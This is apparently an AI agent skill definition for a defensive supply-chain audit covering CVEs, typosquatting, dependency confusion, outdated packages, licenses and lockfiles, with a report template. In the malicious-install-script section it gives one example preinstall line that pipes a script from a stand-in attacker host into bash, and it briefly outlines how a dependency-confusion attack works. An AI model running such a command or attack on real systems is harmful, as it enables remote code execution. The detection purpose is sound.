---
name: perseus-supply-chain
description: Supply chain security analysis (CVEs, dependencies, typosquatting, licenses)
---

# Perseus Supply Chain Specialist

## Context & Authorization

**IMPORTANT:** This skill performs supply chain security analysis on the **user's own codebase**. This is defensive security testing to find vulnerable dependencies before they're exploited.

**Authorization:** The user owns this codebase and has explicitly requested this specialized analysis.

---

## Multi-Language Support

| Language | Package Managers | Manifest Files |
|----------|------------------|----------------|
| JavaScript/TypeScript | npm, yarn, pnpm, bun | package.json, package-lock.json, yarn.lock, pnpm-lock.yaml |
| Go | go modules | go.mod, go.sum |
| PHP | Composer | composer.json, composer.lock |
| Python | pip, poetry, pipenv | requirements.txt, Pipfile, pyproject.toml, poetry.lock |
| Rust | Cargo | Cargo.toml, Cargo.lock |
| Java | Maven, Gradle | pom.xml, build.gradle, gradle.lockfile |
| Ruby | Bundler | Gemfile, Gemfile.lock |
| C# | NuGet | *.csproj, packages.config, packages.lock.json |

---

## Overview

This specialist skill performs comprehensive supply chain analysis including known vulnerabilities (CVEs), dependency confusion, typosquatting, and license compliance.

**When to Use:** After `/scan` identifies package manifests, or as regular security hygiene check.

**Goal:** Identify vulnerable, malicious, or risky dependencies before they compromise the application.

## Supply Chain Risks Covered

| Risk | Description | Impact |
|------|-------------|--------|
| Known CVEs | Published vulnerabilities | Exploitation |
| Typosquatting | Malicious similar-named packages | Malware |
| Dependency Confusion | Private/public package name collision | Code execution |
| Outdated Dependencies | Old versions with known issues | Security debt |
| License Issues | GPL in proprietary, license conflicts | Legal risk |
| Malicious Packages | Intentionally harmful packages | Backdoor |
| Abandoned Packages | Unmaintained dependencies | Future risk |

## Execution Instructions

### Phase 1: Manifest Discovery (1 Agent)

1.  **Manifest Scanner:**
    *   "Find all package manifest files in the repository."

    **Files to Find:**
    ```
    # JavaScript/TypeScript
    package.json
    package-lock.json
    yarn.lock
    pnpm-lock.yaml
    bun.lockb

    # Go
    go.mod
    go.sum

    # PHP
    composer.json
    composer.lock

    # Python
    requirements.txt
    requirements-*.txt
    Pipfile
    Pipfile.lock
    pyproject.toml
    poetry.lock

    # Rust
    Cargo.toml
    Cargo.lock

    # Java
    pom.xml
    build.gradle
    build.gradle.kts
    gradle.lockfile

    # Ruby
    Gemfile
    Gemfile.lock

    # C#
    *.csproj
    packages.config
    Directory.Packages.props
    ```

### Phase 2: Vulnerability Analysis (4 Parallel Agents)

1.  **JavaScript CVE Analyst:**
    *   "Analyze JavaScript/TypeScript dependencies for known CVEs."

    **Check Using:**
    - npm audit data
    - Snyk vulnerability database
    - GitHub Advisory Database
    - NVD (National Vulnerability Database)

    **Output Format:**
    ```markdown
    | Package | Version | CVE | Severity | Fixed In |
    |---------|---------|-----|----------|----------|
    | lodash | 4.17.15 | CVE-2021-23337 | High | 4.17.21 |
    ```

2.  **Go CVE Analyst:**
    *   "Analyze Go dependencies for known CVEs."

    **Check:**
    - govulncheck database
    - Go vulnerability database (vuln.go.dev)

3.  **Python CVE Analyst:**
    *   "Analyze Python dependencies for known CVEs."

    **Check:**
    - PyPI Advisory Database
    - Safety DB
    - pip-audit data

4.  **Multi-Language CVE Analyst:**
    *   "Analyze PHP, Rust, Java, Ruby, C# dependencies."

    **Check:**
    - Packagist Security Advisories (PHP)
    - RustSec Advisory Database (Rust)
    - Maven Central advisories (Java)
    - Ruby Advisory Database (Ruby)
    - NuGet advisories (C#)

### Phase 3: Typosquatting Detection (2 Parallel Agents)

1.  **JavaScript Typosquatting Analyst:**
    *   "Check for typosquatted package names in JavaScript dependencies."

    **Common Patterns:**
    | Real Package | Typosquat Examples |
    |--------------|-------------------|
    | lodash | lodsh, lodahs, 1odash, lodash-utils |
    | express | expres, expresss, expess |
    | react | raect, reakt, reactjs (unofficial) |
    | axios | axois, axio, axiosjs |

    **Detection Rules:**
    - Character substitution (l -> 1, o -> 0)
    - Character omission/addition
    - Character transposition
    - Hyphen/underscore variations
    - Scope confusion (@org/pkg vs @0rg/pkg)

2.  **Multi-Language Typosquatting Analyst:**
    *   "Check typosquatting in Go, Python, PHP, Rust, Ruby."

    **Python Examples:**
    | Real Package | Typosquat Examples |
    |--------------|-------------------|
    | requests | request, reqeusts |
    | django | djang0, djangoo |
    | flask | flaask, flaskk |

### Phase 4: Dependency Confusion Analysis (2 Parallel Agents)

1.  **Private Package Analyst:**
    *   "Identify private/internal packages that could be confused."

    **Risk Pattern:**
    ```json
    // package.json - RISKY
    {
      "dependencies": {
        "@company/internal-lib": "^1.0.0"  // If not in private registry...
      }
    }
    ```

    **Attack:**
    - Attacker publishes `@company/internal-lib` to public npm
    - Build system fetches malicious public package
    - Code execution during install

    **Check:**
    - Scoped packages pointing to public registry
    - Private packages without registry lock
    - Missing .npmrc/.yarnrc configuration

2.  **Registry Configuration Analyst:**
    *   "Check registry configuration for private packages."

    **Files to Check:**
    ```
    .npmrc
    .yarnrc
    .yarnrc.yml
    .pip/pip.conf
    ~/.config/pip/pip.conf
    ```

### Phase 5: Outdated Dependencies Analysis (2 Parallel Agents)

1.  **Major Version Gap Analyst:**
    *   "Find dependencies multiple major versions behind."

    **Risk Levels:**
    | Gap | Risk | Example |
    |-----|------|---------|
    | 1 major | Low | Using React 17 when 18 is out |
    | 2+ major | Medium | Using React 16 when 18 is out |
    | EOL | High | Using Node.js 14 (EOL) |

2.  **Abandoned Package Analyst:**
    *   "Find dependencies that appear abandoned."

    **Indicators:**
    - No commits in 2+ years
    - No releases in 2+ years
    - Open security issues unaddressed
    - Maintainer unresponsive
    - "Looking for maintainer" in README

### Phase 6: License Analysis (2 Parallel Agents)

1.  **License Compatibility Analyst:**
    *   "Check for license compatibility issues."

    **Risk Matrix:**
    | Project License | Dependency License | Status |
    |-----------------|-------------------|--------|
    | MIT | MIT | OK |
    | MIT | Apache-2.0 | OK |
    | MIT | GPL-3.0 | PROBLEM (copyleft) |
    | Proprietary | GPL-3.0 | PROBLEM (copyleft) |
    | Proprietary | AGPL-3.0 | CRITICAL |

2.  **License Discovery Analyst:**
    *   "Find packages with unclear or no license."

    **Issues:**
    - No LICENSE file
    - UNLICENSED or proprietary
    - Custom/unknown license
    - Multiple conflicting licenses

### Phase 7: Malicious Package Detection (2 Parallel Agents)

1.  **Install Script Analyst:**
    *   "Check for suspicious install scripts."

    **Patterns to Flag:**
    ```json
    // package.json - SUSPICIOUS
    {
      "scripts": {
        "preinstall": "curl evil.com/shell.sh | bash",
        "postinstall": "node ./scripts/setup.js"  // Check contents!
      }
    }
    ```

    **Red Flags:**
    - Network calls during install
    - Obfuscated code in install scripts
    - Environment variable exfiltration
    - Writing to system directories

2.  **Dependency Chain Analyst:**
    *   "Analyze transitive dependencies for risks."

    **Issues:**
    - Deep dependency chains (attack surface)
    - Single maintainer packages in chain
    - Recently transferred packages

### Phase 8: Lockfile Analysis (1 Agent)

1.  **Lockfile Security Analyst:**
    *   "Check lockfile integrity and security."

    **Issues:**
    - Missing lockfile (non-reproducible builds)
    - Lockfile not committed
    - Lockfile/manifest mismatch
    - Integrity hashes missing (npm)
    - Registry URLs in lockfile (dependency confusion risk)

## Output Requirements

Create `deliverables/supply_chain_analysis.md`:

```markdown
# Supply Chain Security Analysis

## Summary
| Category | Packages Checked | Issues | Critical |
|----------|------------------|--------|----------|
| CVEs | X | Y | Z |
| Typosquatting | X | Y | Z |
| Dependency Confusion | X | Y | Z |
| Outdated | X | Y | Z |
| License | X | Y | Z |
| Malicious | X | Y | Z |

## Languages/Package Managers Detected
- JavaScript: npm (package.json)
- Python: pip (requirements.txt)
- Go: go modules (go.mod)

## Critical Vulnerabilities (CVEs)

### [CVE-2021-44228] Log4Shell in log4j
**Severity:** Critical (CVSS 10.0)
**Package:** org.apache.logging.log4j:log4j-core
**Installed Version:** 2.14.1
**Fixed Version:** 2.17.1
**Location:** pom.xml

**Description:** Remote code execution via JNDI lookup in log messages.

**Remediation:**
```xml
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.17.1</version>
</dependency>
```

---

### [CVE-2022-0155] SSRF in follow-redirects
**Severity:** High (CVSS 8.0)
**Package:** follow-redirects
**Installed Version:** 1.14.5
**Fixed Version:** 1.14.7
**Location:** package-lock.json (transitive via axios)

---

## Vulnerability Summary by Severity

| Severity | Count | Packages |
|----------|-------|----------|
| Critical | 2 | log4j, lodash |
| High | 5 | axios, node-forge, ... |
| Medium | 12 | ... |
| Low | 8 | ... |

## Typosquatting Risks

| Installed | Suspicious | Confidence |
|-----------|------------|------------|
| lodsh | Likely typosquat of lodash | High |
| requests (in npm) | Python package in npm? | Medium |

## Dependency Confusion Risks

| Package | Risk | Recommendation |
|---------|------|----------------|
| @company/core | No registry lock | Add to .npmrc |

## Outdated Dependencies

| Package | Current | Latest | Gap | Risk |
|---------|---------|--------|-----|------|
| react | 16.14.0 | 18.2.0 | 2 major | Medium |
| node | 14.x | 20.x | EOL | High |

## License Issues

| Package | License | Issue |
|---------|---------|-------|
| some-lib | GPL-3.0 | Copyleft in MIT project |
| unknown-pkg | UNLICENSED | No license |

## Recommendations

### Immediate Actions
1. Update log4j to 2.17.1+
2. Update lodash to 4.17.21+
3. Review typosquatted packages
4. Configure private registry for @company/* packages

### Security Hygiene
```bash
# JavaScript
npm audit fix
npm outdated

# Go
go get -u ./...
govulncheck ./...

# Python
pip-audit
pip list --outdated

# Rust
cargo audit
cargo update
```

### Lockfile Best Practices
- Always commit lockfiles
- Use exact versions in production
- Enable npm's package-lock-only mode
- Configure registry in .npmrc
```

**Next Step:** CVE findings can be verified by checking exploit availability and running automated scanners.
